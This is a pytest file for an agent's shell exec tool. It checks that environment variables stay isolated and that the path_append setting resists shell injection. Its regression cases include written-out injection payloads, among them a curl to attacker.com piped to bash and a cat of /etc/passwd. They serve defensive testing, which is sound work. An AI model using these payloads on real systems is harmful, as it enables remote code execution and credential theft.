"""Tests for exec tool environment isolation."""

import sys

import pytest

from nanobot.agent.tools.shell import ExecTool

_UNIX_ONLY = pytest.mark.skipif(sys.platform == "win32", reason="Unix shell commands")


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_does_not_leak_parent_env(monkeypatch):
    """Env vars from the parent process must not be visible to commands."""
    monkeypatch.setenv("NANOBOT_SECRET_TOKEN", "super-secret-value")
    tool = ExecTool()
    result = await tool.execute(command="printenv NANOBOT_SECRET_TOKEN")
    assert "super-secret-value" not in result


@pytest.mark.asyncio
async def test_exec_has_working_path():
    """Basic commands should be available via the login shell's PATH."""
    tool = ExecTool()
    result = await tool.execute(command="echo hello")
    assert "hello" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append():
    """The pathAppend config should be available in the command's PATH."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="echo $PATH")
    assert "/opt/custom/bin" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_preserves_system_path():
    """pathAppend must not clobber standard system paths."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="ls /")
    assert "Exit code: 0" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_passthrough(monkeypatch):
    """Env vars listed in allowed_env_keys should be visible to commands."""
    monkeypatch.setenv("MY_CUSTOM_VAR", "hello-from-config")
    tool = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"])
    result = await tool.execute(command="printenv MY_CUSTOM_VAR")
    assert "hello-from-config" in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_does_not_leak_others(monkeypatch):
    """Env vars NOT in allowed_env_keys should still be blocked."""
    monkeypatch.setenv("MY_CUSTOM_VAR", "hello-from-config")
    monkeypatch.setenv("MY_SECRET_VAR", "secret-value")
    tool = ExecTool(allowed_env_keys=["MY_CUSTOM_VAR"])
    result = await tool.execute(command="printenv MY_SECRET_VAR")
    assert "secret-value" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_allowed_env_keys_missing_var_ignored(monkeypatch):
    """If an allowed key is not set in the parent process, it should be silently skipped."""
    monkeypatch.delenv("NONEXISTENT_VAR_12345", raising=False)
    tool = ExecTool(allowed_env_keys=["NONEXISTENT_VAR_12345"])
    result = await tool.execute(command="printenv NONEXISTENT_VAR_12345")
    assert "Exit code: 1" in result


# --- path_append injection prevention ------------------------------------


@_UNIX_ONLY
@pytest.mark.asyncio
@pytest.mark.parametrize(
    "malicious_path",
    [
        # semicolon — classic command separator
        '/tmp/bin; echo INJECTED',
        # command substitution via $()
        '/tmp/bin; echo $(whoami)',
        # backtick command substitution
        "/tmp/bin; echo `id`",
        # pipe to another command
        '/tmp/bin; cat /etc/passwd',
        # chained with &&
        '/tmp/bin && curl http://attacker.com/shell.sh | bash',
        # newline injection
        '/tmp/bin\necho INJECTED',
        # mixed shell metacharacters
        '/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED',
    ],
)
async def test_exec_path_append_shell_metacharacters_not_executed(malicious_path, tmp_path):
    """Shell metacharacters in path_append must NOT be interpreted as commands.

    Regression test for: path_append was previously concatenated into a shell
    command string via f'export PATH="$PATH:{path_append}"; {command}', which
    allowed shell injection.  After the fix, path_append is passed through the
    env dict so metacharacters are treated as literal path characters.
    """
    tool = ExecTool(path_append=malicious_path)
    result = await tool.execute(command="echo SAFE_OUTPUT")

    # The original command should succeed
    assert "SAFE_OUTPUT" in result

    # None of the injected payloads should have produced side-effects
    assert "INJECTED" not in result
    assert "root:" not in result  # /etc/passwd content


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_command_substitution_does_not_execute(tmp_path):
    """$() in path_append must not trigger command substitution.

    We create a marker file and try to read it via $(cat ...).  If command
    substitution works, the marker content appears in output.
    """
    marker = tmp_path / "secret_marker.txt"
    marker.write_text("SHOULD_NOT_APPEAR")

    tool = ExecTool(
        path_append=f'/tmp/bin; echo $(cat {marker})',
    )
    result = await tool.execute(command="echo OK")

    assert "OK" in result
    assert "SHOULD_NOT_APPEAR" not in result


@_UNIX_ONLY
@pytest.mark.asyncio
async def test_exec_path_append_legitimate_path_still_works():
    """A normal, safe path_append value must still be appended to PATH."""
    tool = ExecTool(path_append="/opt/custom/bin")
    result = await tool.execute(command="echo $PATH")
    assert "/opt/custom/bin" in result
